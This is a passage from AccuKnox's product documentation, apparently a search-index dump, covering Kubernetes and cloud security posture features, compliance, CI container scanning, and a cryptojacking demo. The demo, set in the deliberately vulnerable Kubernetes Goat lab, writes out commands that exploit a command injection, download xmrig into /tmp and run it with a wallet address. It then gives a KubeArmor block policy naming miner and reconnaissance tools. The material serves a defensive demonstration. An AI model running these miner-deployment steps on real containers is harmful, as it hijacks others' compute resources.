appropriate</p>"},{"location":"use-cases/cis-benchmarking/#description_1","title":"Description","text":"<p>The connections from the apiserver to the kubelet are used for fetching logs for pods, attaching (through kubectl) to running pods and using the kubelet's port-forwarding functionality. These connections terminate at the kubelet's HTTPS endpoint. By default, the apiserver does not verify the kubelet's serving certificate, which makes the connection subject to man-in-the-middle attacks, and unsafe to run over untrusted and/or public networks.</p>"},{"location":"use-cases/cis-benchmarking/#steps_1","title":"Steps","text":"<ol> <li> <p>Go to Issues &gt; Findings in Accuknox.</p> </li> <li> <p>Use the Findings dropdown to filter and select CIS k8s Benchmarking finding results</p> </li> <li> <p>Apply the risk factor as High filter and select Failed from the Tool Output filter</p> </li> <li> <p>Click on Apply</p> </li> </ol> <p></p>"},{"location":"use-cases/cis-benchmarking/#solution","title":"Solution","text":"<p>This will configure TLS on apiserver as well as kubelets to avoid MITM attacks</p>"},{"location":"use-cases/cloud-misconfigurations/","title":"Cloud Misconfigurations & Drift Detection","text":"<p>Securing your most critical assets in Public Cloud</p> <p>To be able to detect misconfigurations and drift detection on onboarded Cloud Account. Misconfigurations is deemed by NSA as leading vulnerability reason in a cloud environment where the risk might be less sophisticated but their implications are generally critical. It could be any configuration that is deterring it from security best practices, gaps or errors which could be scrutinized through security breaches, hackers, ransomware, malware or insider threats that leverage these vulnerabilities to gain illegitimate access to your network.</p> <p>AccuKnox provides you a single pane of glass view with clear action item and a tracking of these findings in a multi-cloud environment. You can also see the continuous compliance trends of the categorized assets of interest to see the conformance or deviation from the custom baselines or standard technical or governance framework in general.</p> <p>After onboarding your account, we would scan your infrastructure on a scheduled interval as per requirement to show you overall infrastructure security assessment. The results would be vulnerabilities and findings which will always be associated to an asset. And you can auto-create, update and manage tickets to resolution of these findings. Also we can let you group your assets and apply a baseline conformance on a periodical manner for drift detection. For proactive monitoring of your specific assets, we enable you to do that with Monitors where you can see deviation in configuration and consequently an alerts whenever there is a change in configuration in those specific critical assets like s3 bucket, remote desktops such as bastions etc.</p> <p>Lets understand this from a specific use-case example - Misconfigured Amazon S3 Public Bucket</p> <p>Step 1: Click on Inventory \u2192 Assets</p> <p></p> <p>Note: After the scan is complete, the assets will be displayed shortly.</p> <p>Step 2: To view the S3 bucket details, click on the filter by assets and select the s3 bucket.</p> <p></p> <p>Step 3: Here List of s3 buckets will be shown. Now click on any of the s3 assets to view the asset details.</p> <p>We selected <code>sh dev-blog-awsgoat-bucket-788471067825</code> s3 bucket.</p> <p></p> <p>Step 4: You will find all the details related to the selected Asset here.</p> <p>Click on <code>sh vulnerabilities graph</code>, It will redirect to the <code>sh vulnerabilities</code> page. </p> <p>Step 5: You can view the findings of s3 misconfigurations. Click on it to see detailed view. </p> <p>Step 6: Here we can see the description of the s3 bucket which is publicly accessible and You can change the status, severity, and other details of the vulnerability. click on the top right corner arrow to get a more detailed view.</p> <p></p> <p></p> <p>Remediation:</p> <p>You can open a ticket and monitor the issue until it is fixed.</p> <p>Configuring block public access settings for your S3 buckets - Amazon Simple Storage Service</p> <p>SCHEDULE DEMO</p>"},{"location":"use-cases/cluster-misconfiguration-scanning/","title":"Cluster Misconfiguration Scanning","text":"<p>Cyber attacks frequently occur due to security misconfigurations in applications and infrastructure. Preventing these vulnerabilities is crucial for maintaining a secure environment. AccuKnox empowers you to identify and remediate security misconfigurations within your Kubernetes clusters, ensuring that your applications and infrastructure are fully protected from potential threats.</p> <p>In AccuKnox you can go to findings page and select the cluster findings to list all of the cluster misconfiguration findings.</p> <p></p> <p>You can click on a finding to see more details about it.</p> <p></p> <p></p> <p>Here AccuKnox detected the application credentials leaked in the Kubernetes configuration. By clicking on the source code tab you can see that there is a hard coded password in a deployment manifest.</p> <p></p> <p>An attacker can use these credentials and access your database. These sort of Kubernetes misconfigurations might get unnoticed by developers or DevOps engineers. By leveraging AccuKnox a user can detect vulnerabilities in time.</p>"},{"location":"use-cases/cluster-misconfiguration-scanning/#remediation","title":"Remediation","text":"<p>AccuKnox provides you assistive remediation. Click on the solution tab and you will see what action can be preformed to remediate this issue.</p> <p></p>"},{"location":"use-cases/cluster-misconfiguration-scanning/#vulnerability-management-lifecycle","title":"Vulnerability Management Lifecycle","text":"<p>You can streamline vulnerability remediation and lifecycle management by creating Jira tickets directly from the AccuKnox UI.</p> <p>Follow these steps for creating a ticket.</p> <p>Step 1. Select a vulnerability and click on the create ticket button.</p> <p></p> <p>Step 2. Select your ticket configuration and click on the create ticket button.</p> <p></p> <p>Step 3. It will open up a new tab where you can review and modify the ticket details. Once you have reviewed the ticket click on the create button.</p> <p></p> <p>In conclusion, AccuKnox helps you to detect, remediate and manage the lifecycle of Kubernetes security misconfiguration vulnerabilities.</p>"},{"location":"use-cases/cnapp-security-overview/","title":"AccuKnox CNAPP Dashboard Widgets","text":""},{"location":"use-cases/cnapp-security-overview/#cwpp-widgets","title":"CWPP Widgets","text":"<p>In CWPP, Accuknox has 32 widgets to visualize the findings. Some of them are shown below.</p>"},{"location":"use-cases/cnapp-security-overview/#1-top-5-cluster-findings-widget","title":"1. Top 5 cluster findings Widget","text":"<p>This widget provides an overview of the top findings and the number of affected resources.</p>"},{"location":"use-cases/cnapp-security-overview/#2-findings-by-asset-categories-widget","title":"2. Findings by Asset Categories Widget","text":"<p>This widget categorizes failed findings by asset type and includes severity details, aiding users in pinpointing which asset categories have severe issues that need immediate attention.</p>"},{"location":"use-cases/cnapp-security-overview/#3-k8s-security-metrics-widgets","title":"3. K8S Security Metrics Widgets","text":"<p>This widget highlights key security metrics related to misconfigurations and vulnerabilities within your Kubernetes clusters, helping to identify and mitigate potential security risks.</p>"},{"location":"use-cases/cnapp-security-overview/#4-workload-alerts-widgets","title":"4. Workload Alerts Widgets","text":"<p>Workload Alerts shows us the alerts generated by each\u00a0container or VM.</p>"},{"location":"use-cases/cnapp-security-overview/#5-workloads-without-any-policy-applied-widget","title":"5. Workloads without any Policy Applied Widget","text":"<p>This widget shows us the total number of workloads with policies and the number of workloads policies which do not have a policy applied. The widget allows filtering based on clusters.</p>"},{"location":"use-cases/cnapp-security-overview/#6-k8s-resource-summarywidget","title":"6. K8s Resource SummaryWidget","text":"<p>This widget displays key metrics related to resource limits, label usage, health checks, and best practices in your Kubernetes clusters.</p>"},{"location":"use-cases/cnapp-security-overview/#7-cluster-connection-status-widget","title":"7. Cluster Connection Status Widget","text":"<p>This widget will show us the\u00a0connection status of Clusters which are onboarded.</p>"},{"location":"use-cases/cnapp-security-overview/#8-workloads-without-network-policies-widget","title":"8. Workloads without Network Policies Widget","text":"<p>This widget displays the number of workloads that lack network policies. The aim is to help users quickly identify potential security gaps where network policies are not enforced.</p>"},{"location":"use-cases/cnapp-security-overview/#9-top-5-k8s-cis-findings-widget","title":"9. Top 5 K8s CIS Findings Widget","text":"<p>This widget highlights the top 5 CIS benchmark related findings in your Kubernetes clusters, sorted by criticality and affected assets. It helps prioritize remediation to improve cluster security and compliance.</p>"},{"location":"use-cases/cnapp-security-overview/#10-block-based-policies-with-associated-alerts-widget","title":"10. Block based Policies with Associated Alerts Widget","text":"<p>This widget shows all the block based policies which are of high severity and have alerts associated.</p>"},{"location":"use-cases/cnapp-security-overview/#cspm","title":"CSPM","text":"<p>There are 5 widgets under the CSPM section</p>"},{"location":"use-cases/cnapp-security-overview/#1-top-3-cloud-accounts-with-failed-controls-widget","title":"1. Top 3 cloud accounts with failed controls Widget","text":"<p>This widget will show the top 3 cloud accounts based on the highest number of failed controls.</p>"},{"location":"use-cases/cnapp-security-overview/#2-top-10-risk-associated-to-cloud-accounts-widget","title":"2. Top 10 risk associated to cloud accounts Widget","text":"<p>This widget assesses and prioritizes risks associated with IAM policies, S3 bucket, security groups, load balancers, etc... across your cloud accounts.</p>"},{"location":"use-cases/cnapp-security-overview/#3-findings-trends-widget","title":"3. Findings Trends Widget","text":"<p>Trend analysis showing the status of findings and their changes over time in the environment.</p>"},{"location":"use-cases/cnapp-security-overview/#4-cloud-accounts-widget","title":"4. Cloud Accounts Widget","text":"<p>This widget shows the number of cloud accounts on boarded\u00a0on the AccuKnox platform and the status of their connection, i.e: Active/Inactive.</p>"},{"location":"use-cases/cnapp-security-overview/#5-findings-widget","title":"5. Findings Widget","text":"<p>This widget shows us the total number of Findings along with top 3 asset categories that have the highest number of Findings associated with them.</p>"},{"location":"use-cases/cnapp-security-overview/#kiem","title":"KIEM","text":"<p>The KIEM section consists of 3 widgets</p>"},{"location":"use-cases/cnapp-security-overview/#1-kiem-risk-assessment-widget","title":"1. Kiem Risk Assessment Widget","text":"<p>This widget shows us the distribution of KIEM findings by criticality.</p>"},{"location":"use-cases/cnapp-security-overview/#2-kiem-findings-by-asset-type-widget","title":"2. KIEM Findings by Asset type Widget","text":"<p>This widget shows the distribution of KIEM findings by the type of assets they were identified in.</p>"},{"location":"use-cases/cnapp-security-overview/#3-top-5-most-critical-findings-widget","title":"3. Top 5 most critical findings Widget","text":"<p>This widget shows the most critical findings with the highest number of occurrences or assets affected for prioritization.</p>"},{"location":"use-cases/cnapp-security-overview/#cloud-misconfiguration-widget","title":"Cloud Misconfiguration Widget","text":"<p>This section currently contains the following widgets</p>"},{"location":"use-cases/cnapp-security-overview/#cloud-account-risk-assessment-widget","title":"Cloud Account Risk Assessment Widget","text":"<p>This widget shows the\u00a0total number of checks that were performed and their result in a pie chart. This can be further filtered to include only the checks for specific cloud accounts.</p>"},{"location":"use-cases/cnapp-security-overview/#images-widgets","title":"./images Widgets","text":"<p>This section consists of two widgets</p>"},{"location":"use-cases/cnapp-security-overview/#1-image-severity-distribution-widget","title":"1. Image Severity Distribution Widget","text":"<p>This widget shows the total number of vulnerable\u00a0./images\u00a0along with the severity level of the vulnerability identified in them. Eg. In the above image, there are 138 ./images identified to contain a critical vulnerability</p>"},{"location":"use-cases/cnapp-security-overview/#2-image-risk-assessment-widget","title":"2. Image Risk Assessment Widget","text":"<p>This widget shows the total number of vulnerabilities identified in all the ./images along with the severity levels.</p>"},{"location":"use-cases/cnapp-security-overview/#tickets-widgets","title":"Tickets Widgets","text":"<p>Here, the following widget exists for visualization.</p>"},{"location":"use-cases/cnapp-security-overview/#tickets-by-status-widget","title":"Tickets by status Widget","text":"<p>This widget shows us the total number of tickets generated for the findings along\u00a0with their\u00a0current status.</p>"},{"location":"use-cases/compliance/","title":"GRC (Governance, Risk Management, and Compliance)","text":"<p>CSPM Misconfigurations comes with more than 1,000 out-of-the-box compliance cheks that evaluate the configuration of your cloud resources and identify potential misconfigurations. Each compliance rule maps to one or more compliance programs and there sub-controls within a compliance standard or industry benchmarks. Cloud security is a dynamic landscape, with ever-evolving threats and regulatory requirements. Compliance with various industry standards such as PCI DSS, HIPAA, GDPR, SOC, ISO, CIS, and many more are crucial for businesses across sectors. However, keeping track of these requirements and ensuring your cloud infrastructure aligns with them can be a daunting task.</p> <p>This is where AccuKnox\u2019s CSPM shines. There are over 30 new compliance programs, From healthcare to finance, retail to government, CSPM covers a wide range of industry-specific regulations, ensuring that your cloud environment meets the necessary security standards.</p>"},{"location":"use-cases/compliance/#view-your-compliance-posture","title":"View your compliance posture","text":"<p>View a high-level overview of your compliance posture for each framework on the Cloud Asset Summary page.</p> <p>As soon as user onboards the cloud account and scan is done, User can navigate to the Compliance Section in Nav Bar and see the list of all compliance programs against which scan were done. Each Compliance Program are divided into there Sub Controls and for each sub control user can see the percentage of compliance.</p> <p>The percentage is calculated by the number of Passed Checks/Rules against the Total number of Passed, Failed, Warning and Not Available checks.</p> <p>User can click on any Compliance Program or there Sub-control which will navigate to the list of misconfiguration. Further user can filter based on Cloud Account, Region, Severity, Checks, and many more on the Detailed View Tab.</p> <ul> <li>Compliance: A  detailed report  that gives you insight into how you score against a framework\u2019s requirements and rules. </li> <li>Detailed View: A filtered view of the  Misconfigurations  page that shows resources with misconfigurations for the selected Compliance Program. </li> </ul>"},{"location":"use-cases/compliance/#compliance-support-matrix","title":"Compliance Support Matrix","text":"AWS Azure GCP 1. APRA 234 STANDARD2. AWS CIS Benchmark v 1 .4.03. AWS CIS Benchmark v 1 .5.04. AWS CIS Benchmark v 2.0.05. AWS Well-Architected Framework - Security6. BAIT7. California Consumer Privacy Act (CCPA)8. COPPA9. CSPM Encryption Program10. FedRamp11. FERPA12. FISMA13. General Data Protection Regulation (GDPR) EU14. HIPAA15. HITRUST CSF16. ISMS-P for AWS17. ISO 2700118. ISO 2701819. Korean Financial Security Agency Guidelines20. LGPD21. Mitre AWS Attack Framework22. NIST 800-17123. NIST CSF24. NIST SP 800-5325. PCI26. SOC 2 Type II27. SOC 328. VAIT 1. APRA 234 STANDARD2. Azure CIS Benchmark v 2.0.03. Azure CIS Benchmark v 1.3.04. BAIT5. California Consumer Privacy Act (CCPA)6. COPPA7. CSPM Encryption Program8. FedRamp9. FERPA10. FISMA11. General Data Protection Regulation (GDPR) EU12. HIPAA13. HITRUST CSF14. ISO 2700115. ISO 2701816. Korean Financial Security Agency Guidelines17. LGPD18. ISO 2701719. NIST 800-17120. NIST CSF21. NIST SP 800-5322. PCI23. SOC 2 Type II24. SOC 325. VAIT 1. APRA 234 STANDARD2. BAIT3. California Consumer Privacy Act (CCPA)4. COPPA5. CSPM Encryption Program6. FedRamp7. FERPA8. FISMA9. General Data Protection Regulation (GDPR) EU10. HIPAA11. HITRUST CSF12. ISO 2700113. ISO 2701714. ISO 2701815. Korean Financial Security Agency Guidelines16. LGPD17. NIST 800-17118. NIST CSF19. NIST SP 800-5320. PCI21. SOC 2 Type II22. SOC 323. VAIT24. GCP CIS Benchmarks V 1.2.O25. GCP CIS Benchmarks V 2.0.0"},{"location":"use-cases/container-scan/","title":"Detecting and Blocking Vulnerable Docker Images with AccuKnox Container Scanning","text":"<p>This guide demonstrates how to integrate AccuKnox's container scanning into a CI/CD pipeline using GitHub Actions. The integration enables automated vulnerability detection and policy enforcement for container images, ensuring that insecure artifacts are never deployed to production environments.</p> <p>By embedding AccuKnox container scans in your DevSecOps workflows, security validation becomes an automated gatekeeper, enabling early detection of vulnerabilities, rapid remediation, and compliance with security best practices.</p>"},{"location":"use-cases/container-scan/#scenario","title":"Scenario","text":"<p>Imagine a development team building a Node.js web application using an outdated base image (<code>node:18-alpine</code>). This image includes multiple known vulnerabilities. Without scanning, the image is pushed to production, exposing the system to exploitation. By integrating AccuKnox scanning into the CI/CD pipeline, these risks can be identified and blocked before deployment.</p>"},{"location":"use-cases/container-scan/#objective","title":"Objective","text":"<p>This guide shows how to:</p> <ul> <li>Detect container vulnerabilities using AccuKnox's GitHub Actions plugin.</li> <li>Prevent deployment of insecure Docker images.</li> <li>Automate the scanning process for every code push or pull request.</li> <li>View scan results in the AccuKnox SaaS dashboard.</li> <li>Remediate vulnerabilities and verify fixes.</li> </ul>"},{"location":"use-cases/container-scan/#steps-overview","title":"Steps Overview","text":"<ol> <li>Setup</li> <li>Integrate AccuKnox's GitHub Action in CI/CD</li> <li>Understand the risks before integration</li> <li>Compare benefits after integration</li> <li>Explore the AccuKnox SaaS dashboard</li> <li>Remediate detected issues and rescan</li> <li>Verify security posture improvements</li> </ol>"},{"location":"use-cases/container-scan/#setup","title":"Setup","text":"<p>Here's a Dockerfile using an outdated and vulnerable Node.js base image:</p> <pre><code>FROM node:18-alpine\n# Additional setup commands\n</code></pre> <p>This image includes known CVEs. Without a security scan, these vulnerabilities would go unnoticed. When the image is built and pushed:</p> <pre><code>Building Docker image...\nImage built successfully: your-image:latest\nPushing your-image:latest to Docker Hub...\nImage pushed successfully.\n</code></pre> <p>At this stage, there's no safeguard preventing the release of insecure code.</p>"},{"location":"use-cases/container-scan/#github-actions-workflow-integration-accuknox-container-scan","title":"GitHub Actions Workflow Integration (AccuKnox Container Scan)","text":"<p>Now, let's integrate AccuKnox's container scan into the GitHub Actions workflow.</p>"},{"location":"use-cases/container-scan/#create-a-github-actions-workflow-at-githubworkflowscontaineryml","title":"Create a GitHub Actions workflow at <code>.github/workflows/container.yml</code>","text":"<pre><code>name: AccuKnox Scan Workflow\n\non:\n  push:\n    branches:\n      - all\n\njobs:\n  accuknox-cicd:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@main\n\n      - name: Build Docker image\n        run: |\n          IMAGE_NAME=\"github-action-test\"\n          IMAGE_TAG=\"latest\"\n          docker build -t \"$IMAGE_NAME:$IMAGE_TAG\" .\n          echo \"Successfully built Docker image: $IMAGE_NAME:$IMAGE_TAG\"\n\n      - name: \"Run Accuknox Container\"\n        uses: accuknox/container-scan-action@1.0.0\n        with:\n          endpoint: \"&lt;ACCUKNOX_ENDPOINT&gt;\"\n          tenant_id: &lt;ACCUKNOX_TENANT_ID&gt;\n          token: ${{ secrets.ACCUKNOX_TOKEN }}\n          label: &lt;ACCUKNOX_LABEL&gt;\n          image: \"github-action-test\"\n          tag: \"latest\"\n</code></pre>"},{"location":"use-cases/container-scan/#explanation","title":"Explanation","text":"<ul> <li> <p>Build Docker Image:</p> <ul> <li>Sets <code>IMAGE_NAME</code> to <code>github-action-test</code> and <code>IMAGE_TAG</code> to <code>latest</code>.</li> <li>Builds a Docker image from the Dockerfile in the repo.</li> <li>Tag the image as <code>github-action-test:latest</code>.</li> </ul> </li> <li> <p>Run AccuKnox Container Scan:</p> <ul> <li>Uses <code>AccuKnox Container Scan</code> to scan the built Docker image.</li> <li>Sends scan data to <code>cspm.demo.accuknox.com</code> with the given <code>tenant_id</code> and secret <code>token</code>.</li> <li>Applies a label <code>\"SPOC\"</code> for identification.</li> <li>Scans the image tagged as <code>github-action-test:latest</code>.</li> </ul> </li> </ul>"},{"location":"use-cases/container-scan/#before-integration","title":"Before Integration","text":"<p>Without security automation: - Vulnerable images are unknowingly pushed to production. - Developers rely on manual checks or periodic scans. - Security issues are detected late, increasing remediation costs. - No centralized vulnerability tracking or compliance validation.</p>"},{"location":"use-cases/container-scan/#after-integration","title":"After Integration","text":"<p>With AccuKnox integrated: - Every push or pull request triggers a vulnerability scan. - Insecure builds are blocked automatically. - Findings are centralized in the AccuKnox dashboard. - Developers are alerted in real-time and can act quickly. - Continuous compliance with security baselines is maintained.</p> <p></p>"},{"location":"use-cases/container-scan/#viewing-findings-on-accuknox-saas","title":"Viewing Findings on AccuKnox SaaS","text":"<p>After a scan:</p> <ol> <li> <p>Log in to AccuKnox SaaS.</p> </li> <li> <p>Navigate to Issues \u2192 RegistryScan. </p> </li> <li> <p>Locate your repository and click on the scanned image.</p> </li> <li> <p>Explore metadata, vulnerability list, and scan history. </p> </li> </ol>"},{"location":"use-cases/container-scan/#vulnerabilities-tab","title":"Vulnerabilities Tab","text":"<ul> <li>Displays CVEs and affected packages.</li> <li>Includes severity (CRITICAL, HIGH, etc.) and remediation advice. </li> </ul>"},{"location":"use-cases/container-scan/#sensitive-data-tab","title":"Sensitive Data Tab","text":"<ul> <li>Highlights secrets or credentials leaked into the image.</li> </ul>"},{"location":"use-cases/container-scan/#resources-tab","title":"Resources Tab","text":"<ul> <li>Lists all software components, libraries, and dependencies detected. </li> </ul>"},{"location":"use-cases/container-scan/#remediating-the-vulnerability","title":"Remediating the Vulnerability","text":""},{"location":"use-cases/container-scan/#create-a-ticket","title":"Create a Ticket","text":"<ul> <li> <p>You can create a ticket directly from AccuKnox Findings by integrating your organization's ticketing system (Jira, ServiceNow, etc.) with AccuKnox.</p> </li> <li> <p>This ensures vulnerabilities detected during scans are automatically or manually ticketed for tracking and resolution.</p> </li> <li> <p>Refer to the integration guide for setup:   \ud83d\udd17 AccuKnox Jira Cloud Integration Guide</p> </li> <li> <p>To create the ticket, go to Issues &gt; Findings and select Container Image Findings to see identified vulnerabilities. </p> </li> <li> <p>Click on a vulnerability to view more details </p> </li> <li> <p>Create a Ticket for Fixing the Vulnerability </p> </li> </ul>"},{"location":"use-cases/container-scan/#fix-the-code","title":"Fix the Code","text":"<p>Update the Dockerfile to a secure base image</p>"},{"location":"use-cases/container-scan/#re-scan","title":"Re-Scan","text":"<p>Push the code or re-run the workflow manually:</p> <p>GitHub Actions will:</p> <ul> <li> <p>Rebuild the image.</p> </li> <li> <p>Trigger the AccuKnox scan.</p> </li> <li> <p>Upload findings again to the SaaS portal.</p> </li> </ul>"},{"location":"use-cases/container-scan/#verification","title":"Verification","text":"<p>Return to the AccuKnox dashboard:</p> <ul> <li> <p>Confirm that previous CVEs are marked resolved.</p> </li> <li> <p>Ensure that new scan reports show \"No Critical Vulnerabilities.\"</p> </li> </ul>"},{"location":"use-cases/container-scan/#conclusion","title":"Conclusion","text":"<p>Integrating AccuKnox's ASPM container scan into your CI/CD pipeline provides real-time, automated protection against known vulnerabilities. This shift-left security approach ensures that only hardened, production-ready images reach your container registry.</p> <p>Benefits include:</p> <ul> <li> <p>Faster feedback loops for developers.</p> </li> <li> <p>Stronger security posture.</p> </li> </ul>"},{"location":"use-cases/crypto-mining/","title":"Cryptojacking","text":"<p>Cryptojacking, the unauthorized use of someone else\u2019s computing resources for cryptocurrency mining, is a silent but rapidly growing menace. Cryptocurrency mining steals the resources of infected machines, significantly affecting their performance and increasing the wear and tear of hardware. The mining also leads to other costs, like increased power consumption or resource consumption on the cloud.</p> <p>To showcase a cryptojacking attack, the Kubernetes Goat environment is used(Kubernetes Goat Setup). The Health Check deployment in Kubernetes Goat has a command injection vulnerability which allows executing commands inside the container by prefixing <code>;</code></p>"},{"location":"use-cases/crypto-mining/#exploiting-vulnerability-to-deploy-xmrig","title":"Exploiting vulnerability to deploy xmrig","text":"<p>To exploit the command injection vulnerability and get started with mining, start by checking the OS that the container is running on:</p> <p><pre><code>$ uname -a\n</code></pre> For the health check deployment, the OS is ubuntu.</p> <p>Step 1: Download the binary release of xmrig for linux-static from the open source github page. The attacker will use a version of the binary with the config file already populated with the required info.</p> <p><pre><code>$ wget https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-linux-static-x64.tar.gz -P /tmp\n</code></pre> After executing the above, the binary is downloaded into the container which can be confirmed by using <code>ls</code></p> <p></p> <p>Step 2: Install the xmrig binary into the <code>/tmp</code> folder</p> <p><pre><code>$ tar xvzf /tmp/xmrig-6.21.2-linux-static-x64.tar.gz -C /tmp\n</code></pre> On successful install, an output similar to below will be visible</p> <p></p> <p>Step 3: Try running xmrig with the below command</p> <p><pre><code>$ /tmp/xmrig-6.21.2/xmrig 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD\n</code></pre> Now xmrig starts to mine and here, the load becomes too high that the container gets restarted <pre><code>vagrant@demo:~/kubernetes-goat$ kubectl get pods -l app=health-check -w\nNAME                                       READY   STATUS    RESTARTS        AGE\nhealth-check-deployment-5777c5c54b-xfsjr   1/1     Running   2 (7m49s ago)   19h\nhealth-check-deployment-5777c5c54b-xfsjr   0/1     OOMKilled   2 (10m ago)     19h\nhealth-check-deployment-5777c5c54b-xfsjr   1/1     Running     3 (7s ago)      19h\n</code></pre></p>"},{"location":"use-cases/crypto-mining/#protection-using-accuknox","title":"Protection Using AccuKnox","text":"<p>AccuKnox can help protect against cryptominers by blocking specific executables used for mining and thwarting the other generally used techniques for deploying cryptominers.</p> <p>The following KubeArmor policy can be used for securing the health check deployment from any cryptominers including xmrig:</p> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: prevent-crypto-miners\nspec:\n  selector:\n    matchLabels:\n      app: health-check\n\n  action: Block\n  process:\n    # do not allow execution of binaries from /tmp/ directory\n    matchDirectories:\n    - dir: /tmp/\n      recursive: true\n\n    matchPaths:\n    # do not allow execution of xmrig (xmrig.com)\n    - execname: xmrig\n\n    # prevent execution of Dero miner\n    - execname: dero\n    - execname: dero-miner-linux-amd64\n    - execname: dero-wallet-cli-linux-amd64\n    - execname: derod-linux-amd64\n\n    # do not allow execution of masscan/zgrab2/nmap used for recon\n    - execname: zgrab2\n    - execname: masscan\n    - execname: nmap\n\n    # do not allow package management tools execution\n    - execname: apt\n    - execname: apk\n\n    # time sync is important for miners. typically ntpdate is used.\n    - execname: ntpdate\n\n  # Do not allow overwriting system binaries\n  file:\n    matchDirectories:\n    - dir: /usr/local/bin/\n      readOnly: true\n      recursive: true\n    - dir: /sbin/\n      readOnly: true\n      recursive: true\n    - dir: /bin/\n      readOnly: true\n      recursive: true\n    - dir: /usr/bin/\n      readOnly: true\n      recursive: true\n    - dir: /var/local/bin/\n      readOnly: true\n      recursive: true\n    - dir: /boot/\n      readOnly: true\n      recursive: true\n\n  message: cryptominer detected and blocked\n  severity: 10\n  tags:\n    - cryptominer\n</code></pre> <p>The above policy,</p> <ul> <li> <p>Prevents execution of binaries from the <code>/tmp/</code> directory</p> </li> <li> <p>Prevents execution of any processes with an execname of <code>xmrig</code>, <code>dero</code>, <code>dero-miner-linux-amd64</code>, <code>dero-wallet-cli-linux-amd64</code>, <code>derod-linux-amd64</code>, <code>zgrab2</code>, <code>masscan</code>, <code>nmap</code>, <code>apt</code>, <code>apk</code> and <code>ntpdate</code> in the system</p> </li> <li> <p>Prevents write to <code>/usr/local/bin/</code>, <code>/sbin/</code>, <code>/bin/</code>, <code>/usr/bin/</code>, <code>/var/local/bin/</code>, <code>/boot/</code> which contain system binaries</p> </li> </ul> <p>To apply the policy in SaaS,</p> <p>Step 1: To create the policy Navigate to Runtime Protection \u2192 Policies. Then select Create Policy option from the screen.</p> <p></p> <p>Step 2: In the policy editor tool create/upload the above policy. Select the Cluster, namespace, Save and then select Save to workspace option.</p> <p></p> <p>Step 3: Apply the policy by clicking on the three dots next to the saved policy and selecting Apply Policy.</p> <p></p> <p>Step 4: The policy is applied successfully. Now, try to execute xmrig again</p> <p><pre><code>$ /tmp/xmrig-6.21.2/xmrig 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD\n</code></pre> Exit status 126 is shown as xmrig is not allowed to be executed</p> <p></p> <p>Alerts are generated for the execution attempt:</p> <pre><code>ClusterName: k3scluster\nHostName: worker-node02\nNamespaceName: default\nPodName: health-check-deployment-5777c5c54b-xfsjr\nLabels: app=health-check\nContainerName: health-check\nContainerID: cd273bd868238379e9c419e9fbe7b5aeef099d8786502745cf341cf6b2b17116\nContainerImage: docker.io/madhuakula/k8s-goat-health-check:latest@sha256:ab8f3dd527e0a180f42af358d88b22e4bbe8ca81f45f6e404780e665b63da97e\nType: MatchedPolicy\nPolicyName: prevent-crypto-miners\nSeverity: 10\nMessage: cryptominer detected and blocked\nSource: /bin/dash\nResource: /tmp/xmrig-6.21.2/xmrig 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD\nOperation: Process\nAction: Block\nData: syscall=SYS_EXECVE\nEnforcer: AppArmor\nResult: Permission denied\nATags: [cryptominer]\nCwd: /\nHostPID: 21988\nHostPPID: 21986\nOwner: map[Name:health-check-deployment Namespace:default Ref:Deployment]\nPID: 38\nPPID: 36\nParentProcessName: /bin/dash\nProcessName: /tmp/xmrig-6.21.2/xmrig\nTags: cryptominer\nUID: 0\n</code></pre> <p>The permission is denied for xmrig as a binary with that execname is not allowed to be executed. We have also set to prevent execution of binaries from the <code>/tmp/</code> directory to prevent any other cryptominers to be executed using the same methodology.</p>"},{"location":"use-cases/crypto-mining/#key-takeaways","title":"Key Takeaways","text":"<ul> <li> <p>Most of the cryptominers deploy binaries in the <code>/tmp/</code> folder and execute from there - AccuKnox can prevent any executions from the <code>/tmp/</code> folder to protect against it.</p> </li> <li> <p>Time synchronization is critical for mining software and attackers use pre-installed tools such as <code>ntpdate</code> for date/time sync - AccuKnox can prevent the attacker\u2019s binary from accessing them.</p> </li> <li> <p>Cryptominers use package management tools to install accessory tooling - AccuKnox can essentially disable the use of package managers.</p> </li> <li> <p>Common way to prevent any current and future crypto mining attacks would be to use KubeArmor Zero Trust policies which essentially limits any unauthorized access by network primitives, process-exec primitives, file-access primitives by any unknown binaries.</p> </li> </ul>"},{"location":"use-cases/cspm/","title":"Cloud Security Posture Management (CSPM)","text":""},{"location":"use-cases/cspm/#cloud-security-posture-management-cspm","title":"Cloud Security Posture Management (CSPM)","text":"<p>CSPM refers to a category of tools and practices used to manage and improve the security posture of cloud environments, such as AWS, Azure, or Google Cloud. CSPM helps organizations ensure their cloud resources and configurations comply with security best practices, industry standards, and regulatory requirements.</p>"},{"location":"use-cases/cspm/#cspm-use-cases","title":"CSPM Use Cases","text":"<p>Asset Inventory</p> <p>Cloud Misconfiguration &amp; Drift Detection</p>"},{"location":"use-cases/cspm/#accuknox-features","title":"AccuKnox Features","text":"<p>Accuknox helps users by providing continuous compliance, asset inventory, misconfiguration findings, Governance, Risk, and Compliance (GRC).</p> <ul> <li>Asset Inventory: Automated discovery and categorization of cloud resources</li> <li>Drift Detection: Single-pane tracking of compliance configuration changes</li> <li>Continuous Compliance: Support for 30+ compliance frameworks</li> <li>Risk Assessment: Prioritized insights on misconfigurations</li> <li>Multi-Cloud Platform: Unified governance across AWS, GCP, Azure</li> </ul>"},{"location":"use-cases/cspm/#key-capabilities","title":"Key Capabilities","text":"<ul> <li>Comprehensive cloud asset visibility</li> <li>Automated compliance monitoring</li> <li>Actionable remediation guidance</li> <li>Cross-platform security management</li> </ul> <p>Info</p> <p>For more information on our CSPM offering, visit the AccuKnox CSPM Page.</p>"},{"location":"use-cases/cwpp/","title":"CWPP (Cloud Workload Protection Platform)","text":""},{"location":"use-cases/cwpp/#cwpp-cloud-workload-protection-platform","title":"CWPP (Cloud Workload Protection Platform)","text":"<p>CWPP is a Workload-centric security solution protecting server workloads across 